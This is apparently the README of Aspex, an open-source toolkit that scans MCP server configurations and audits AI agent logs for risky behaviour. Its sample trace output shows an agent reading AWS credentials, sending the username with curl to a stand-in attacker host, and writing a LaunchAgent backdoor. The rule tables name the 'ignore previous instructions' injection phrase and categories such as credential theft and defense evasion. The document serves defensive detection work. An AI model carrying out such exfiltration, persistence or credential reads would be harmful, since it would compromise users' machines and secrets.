<div align="center">

<img src="docs/logo.svg" width="88" height="88" alt="Aspex logo"/>

# Aspex

### AI Agent Security Toolkit

**Scan your MCP servers before you trust them. Audit what your agents actually did.**

[![License: Apache-2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
[![CI](https://github.com/aspex-security/aspex/actions/workflows/ci.yml/badge.svg)](https://github.com/aspex-security/aspex/actions/workflows/ci.yml)
[![MCP-scanned by Aspex](https://img.shields.io/badge/MCP--scanned-by%20Aspex-5B44C3)](https://github.com/aspex-security/aspex)

```sh
gh release download v0.1.0 --repo aspex-security/aspex -p "install.sh" -O - | sh
```

**Offline. No account. No data leaves your machine. Ever.**

</div>

---

## What is Aspex?

Aspex is an open-source AI agent security toolkit. It ships two CLI tools that cover the two most important questions in any agent-powered workflow.

| Tool | Question it answers |
|---|---|
| `aspex-scan` | Is the MCP server I just installed safe to run? |
| `aspex-trace` | What did my agent actually do while I wasn't looking? |

**aspex-scan** reads every MCP client config on the machine, connects to each server (stdio and HTTP/SSE), enumerates tools, resources, and prompts, and produces a scored risk report. It catches misconfigurations, dangerous capabilities, and credential leaks before an agent ever calls a tool.

**aspex-trace** reads the native log files that Claude Desktop, Claude Code, Cursor, and Windsurf already write to disk. No proxy. No config change. No runtime dependency. It replays what happened, flags anomalous tool calls, and surfaces post-exploitation patterns: credential reads, persistence writes, outbound network calls.

Both tools run fully offline. No account. No data sent anywhere.

## The problem

You wired an MCP server into Claude Desktop or Cursor. You copy-pasted the config from a README, or maybe a blog post. The agent now has access to your filesystem, your GitHub, your browser.

Do you know what that server is actually capable of? Do you know what it did the last time your agent ran?

There is no equivalent of `npm audit` for MCP. No unified view of what your agents did. No security layer between "I installed a server" and "it has shell access to my machine." Aspex is that layer.

---

## aspex-scan

> Scan your MCP setup before you trust it.

aspex-scan reads every MCP client config on the machine, connects to each server (stdio and HTTP/SSE), enumerates tools, resources, and prompts, and produces a scored risk report. Catches misconfigurations, dangerous capabilities, and credential leaks before an agent ever calls a tool.

### What it looks like

```
  ◆  Aspex  v0.1.0

  ╭─────────────────────────────────────────────────────────────╮
  │   12 / 100  ██░░░░░░░░░░░░░░░░░░░░░░  HIGH RISK            │
  │  6 servers · 98 tools · 29 findings · 5s elapsed           │
  │  6 critical  11 high  12 medium                             │
  ╰─────────────────────────────────────────────────────────────╯

  CRITICAL ────────────────────────────────────────────────────

  ◉  playwright              cursor  ·  0 / 100

     CRITICAL  MCP020  Arbitrary code execution
     │ Tool 'browser_run_code_unsafe' executes arbitrary code.
     │ OWASP LLM06 · CWE-94 · CWE-78
     ╰ fix: Remove this tool or sandbox it strictly.

     HIGH      MCP013  Screen capture capability
     │ Tool 'browser_take_screenshot' can capture screen contents.
     │ OWASP LLM02 · CWE-359
     ╰ fix: Remove unless central to the server's stated purpose.

  OK ─────────────────────────────────────────────────────────

  ○  memory  cursor  100 / 100

  ──────────────────────────────────────────────────────────────
  This scanned 1 machine. Fleet-wide coverage: https://onyx.security
```

### What it catches (150+ rules)

| Category | Rules | Examples |
|---|---|---|
| **Prompt injection** | MCP001, MCP002, MCP018 | Hidden Unicode in descriptions, "ignore previous instructions", homoglyph tool names, descriptions >2000 chars |
| **Code execution** | MCP003, MCP020 | `run_command`, `bash`, `eval_code`, `run_python`, code interpreter tools |
| **Credential theft** | MCP006, MCP011, MCP014 | API keys in plaintext env, `get_env` tools, browser cookie/keychain access |
| **Filesystem** | MCP004, MCP008, MCP017 | Arbitrary write, cron/LaunchAgent/rc-file persistence, CI/CD config write |
| **Network** | MCP005, MCP016, MCP021, MCP023 | Unrestricted SSRF, internal network access, plaintext HTTP, cloud metadata endpoint |
| **Supply chain** | MCP007, MCP022 | `@latest` / `@next` tags, package manifest write |
| **Surveillance** | MCP012, MCP013 | Clipboard read, screen capture |
| **Recon** | MCP009, MCP024 | Process spawn, port scan, `list_processes` |
| **Remote server** | MCP010, MCP021 | No auth token, plaintext HTTP |
| **Attack surface** | MCP019, MCP025, MCP026 | No input schema, duplicate tool names, >30 tools |
| **Container & orchestration** | MCP027–MCP035 | exec into containers, privileged deploy, cluster admin binding |
| **Data exfiltration** | MCP036–MCP050 | Email send, outbound webhooks, cloud storage upload |
| **Persistence** | MCP051–MCP070 | Registry writes, launchd/systemd daemons, init script modification |
| **Surveillance (expanded)** | MCP071–MCP090 | Audio capture, video/camera access, location tracking |
| **Defense evasion** | MCP091–MCP110 | Log clearing, AV/EDR bypass, timestomping |
| **Supply chain expansion** | MCP111–MCP130 | Package manager abuse, build system hooks, dependency confusion |

All findings map to **OWASP LLM Top 10 2025**, **MITRE ATLAS**, and **CWE**.

### Install

```sh
# Homebrew (macOS / Linux)
brew install aspex-security/tap/aspex

# One line — macOS, Linux, Windows (WSL). Requires gh CLI (https://cli.github.com).
gh release download v0.1.0 --repo aspex-security/aspex -p "install.sh" -O - | sh

# Install to a custom directory
INSTALL_DIR=~/.local/bin gh release download v0.1.0 --repo aspex-security/aspex -p "install.sh" -O - | sh

# Or download a binary directly: https://github.com/aspex-security/aspex/releases
```

### Usage

```
aspex-scan [flags]
aspex-scan [command]

Commands:
  inspect <target>      Inspect a single server by command or URL
  diff --baseline <f>   Compare to a saved baseline (rug-pull detection)
  verify <package>      Check a package against the known-bad registry
  install-hook          Install a git pre-commit hook
  uninstall-hook        Remove the pre-commit hook
  version               Print version

Flags:
  --no-exec             Static only: parse configs, skip launching servers
  --clients <list>      Comma-separated: claude,claude-code,cursor,vscode,windsurf,cline,roo-cline,continue,zed
  --json                Machine-readable JSON output
  --sarif               SARIF output (for GitHub code scanning)
  --html <file>         Write a self-contained HTML report to file
  --watch               Re-scan automatically when configs change
  --fail-on <sev>       Exit 1 at this severity: critical, high, medium, low (default: off)
  --no-color
```

### Rug-pull detection

Save a baseline when your config is clean, then check for regressions in CI:

```sh
# Save a clean baseline
aspex-scan --json > baseline.json

# Check for net-new findings (exit 1 if any)
aspex-scan diff --baseline baseline.json
```

### Pre-commit hook

Block commits that introduce risky MCP config changes:

```sh
aspex-scan install-hook
```

Adds a hook that runs `--no-exec --fail-on high` on any staged MCP config file.

### GitHub Action

```yaml
- name: Scan MCP configuration
  uses: aspex-security/aspex/.github/actions/aspex-scan-action@v0.1.0
  with:
    fail-on: high
```

---

## aspex-trace

> Find out what your agent actually did.

Reads the native log files that Claude Desktop, Claude Code CLI, Cursor, and Windsurf already write to disk. Parses them into a unified, security-annotated audit trail. No proxy. No config change. No runtime dependency.

### What it looks like

```
  ◆  Aspex  v0.1.0

  Clients: Claude Desktop, Claude Code, Cursor
  Sessions: 6 (last 24h)   Tool calls: 243 across 11 servers

  CRITICAL
  ● [02:17:44]  cursor / filesystem-mcp    run_command
    "curl https://c2.evil.example/$(whoami)"
    AT003   Shell command executed                    OWASP LLM06 · CWE-78
    AT002   Outbound network call to external host    OWASP LLM08 · CWE-918

  CRITICAL
  ● [02:17:46]  cursor / filesystem-mcp    write_file
    /Users/alice/Library/LaunchAgents/backdoor.plist
    AT014   Persistence mechanism write (LaunchAgent) OWASP LLM06 · ATLAS AML.T0048

  HIGH
  ● [02:17:41]  cursor / filesystem-mcp    read_file   /Users/alice/.aws/credentials
    AT001   Sensitive path accessed                    OWASP LLM02 · CWE-22

  OK: 237 tool calls showed no anomalies.
```

*That session happened at 2:17 AM. The agent read AWS credentials, made an outbound curl to an external host, then wrote a LaunchAgent plist. Textbook post-exploitation sequence. aspex-trace caught it from logs already on disk.*

### What it catches (85+ rules)

| Category | Rules | Examples |
|---|---|---|
| **Credential access** | AT001, AT010, AT016 | `.env`, `.ssh/id_rsa`, `.aws/credentials`, `kubeconfig`, browser cookies, env var dump |
| **Code execution** | AT003, AT014 | Shell tools called, arbitrary code eval |
| **Persistence** | AT014, AT006 | LaunchAgent/cron/rc-file writes, shell init modification |
| **Exfiltration** | AT002, AT015, AT017 | Outbound network calls, cross-server data chains, database dumps |
| **Surveillance** | AT019, AT020 | Clipboard read, screen capture |
| **Recon** | AT012, AT018, AT013 | Other-user home dir access, network scanning, mass file enumeration |
| **Supply chain** | AT009 | Package manifest modified |
| **Infrastructure** | AT007, AT008 | Cloud metadata endpoint access, VCS internals |
| **Anomalous patterns** | AT004, AT005, AT011 | High-volume data, off-hours activity, error bursts (stateful) |
| **Container & orchestration** | AT021–AT030 | exec into containers, privileged deploy, cluster admin activity |
| **Data exfiltration (expanded)** | AT031–AT050 | Email send via MCP, outbound webhooks, cloud storage upload |
| **Persistence (expanded)** | AT051–AT065 | Registry writes, systemd/launchd daemon installs, init modifications |
| **Surveillance (expanded)** | AT066–AT080 | Audio/video capture, location API access |
| **Defense evasion** | AT081–AT095 | Log deletion, AV process termination |
| **Supply chain expansion** | AT096–AT110 | Package manager invocations, build system modifications |

Stateful rules (AT011 error burst, AT013 mass enumeration, AT015 cross-server chain) track state across the full session, not just individual events.

### Behavioral baseline

Learn what normal looks like for your setup, then flag deviations automatically:

```sh
# Build a baseline from the last 7 days of activity
aspex-trace baseline --learn --since 7d

# Future runs compare against it
aspex-trace --baseline ~/.config/aspex/aspex-trace-baseline.json
```

Deviations flagged: new tools called for the first time, off-hours activity, oversized arguments, new outbound hosts, new file path prefixes.

### Install

```sh
# Homebrew (macOS / Linux)
brew install aspex-security/tap/aspex

# One line — installs both aspex-scan and aspex-trace
gh release download v0.1.0 --repo aspex-security/aspex -p "install.sh" -O - | sh

# Or download a binary directly: https://github.com/aspex-security/aspex/releases
```

### Usage

```
aspex-trace [flags]
aspex-trace [command]

Commands:
  baseline --learn     Build a behavioral baseline from recent logs
  version              Print version

Flags:
  --client <name>      Filter to one client: claude, claude-code, cursor, windsurf
  --server <name>      Filter to one MCP server name
  --since <duration>   24h, 7d, 1h (default: 24h)
  --baseline <file>    Compare against a saved behavioral baseline
  --json               Machine-readable JSON output
  --sarif              SARIF output for code scanning
  --fail-on <sev>      Exit 1 at this severity (default: high)
  --no-color
```

### GitHub Action

```yaml
- name: Trace agent activity
  uses: aspex-security/aspex/.github/actions/aspex-trace-action@v0.1.0
  with:
    since: 24h
    fail-on: critical
```

---

## Privacy

Aspex is intentionally simple and intentionally limited.

**What it does not do:**

- Never sends configs, findings, file paths, or tool names anywhere.
- Never proxies or intercepts live traffic.
- Never calls `tools/call` on any MCP server.
- Never reads env variable values from config files (key names only).
- Point-in-time, single-machine by design.

The only network call either tool makes is downloading the binary at install time. After that: fully offline.

Release binaries are signed with [cosign](https://github.com/sigstore/cosign) (keyless, Sigstore). SLSA provenance and SPDX SBOM are published with every release.

```sh
cosign verify-blob \
  --certificate checksums.txt.pem \
  --signature checksums.txt.sig \
  checksums.txt
```

Fleet-wide continuous monitoring, policy enforcement, and attack-path correlation are what [Onyx Security](https://onyx.security) builds. Aspex is the free on-ramp.

---

## Framework coverage

Every finding in both tools maps to at least one of:

| Framework | Coverage |
|---|---|
| [OWASP LLM Top 10 2025](https://owasp.org/www-project-top-10-for-large-language-model-applications/) | LLM01, LLM02, LLM03, LLM06, LLM08 |
| [MITRE ATLAS](https://atlas.mitre.org/) | AML.T0010, AML.T0043, AML.T0048, AML.T0051, AML.T0057 |
| [CWE](https://cwe.mitre.org/) | CWE-20, 22, 77, 78, 89, 94, 116, 200, 214, 272, 284, 306, 307, 312, 319, 359, 522, 526, 732, 829, 918 |

---

## Contributing

The most impactful contributions are new rules and log format updates as clients evolve.

See [CONTRIBUTING.md](CONTRIBUTING.md) for how to add a rule, a trace anomaly, a new client, or a log format update.

**Adding a rule takes about 15 minutes:** write a check function, add it to `EvalServer`, write a positive and negative test, add a doc page.

---

## License

Apache-2.0. See [LICENSE](LICENSE) and [NOTICE](NOTICE).

Built and maintained by [Onyx Security](https://onyx.security). Free forever.
